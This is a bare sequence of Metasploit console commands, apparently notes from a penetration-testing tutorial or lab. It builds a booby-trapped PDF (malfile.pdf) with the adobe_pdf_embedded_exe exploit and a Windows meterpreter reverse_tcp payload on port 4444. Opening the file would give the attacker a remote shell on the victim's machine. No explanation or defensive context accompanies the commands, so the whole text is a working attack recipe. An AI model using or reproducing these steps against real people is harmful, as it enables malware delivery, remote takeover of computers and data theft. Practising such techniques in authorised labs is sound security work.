cd metasploit-framework
sudo bash msfconsole

  use exploit/windows/fileformat/adobe_pdf_embedded_exe
  set payload windows/meterpreter/reverse_tcp
  set FILENAME malfile.pdf
  set LPORT 4444
  show options
  show info
  run
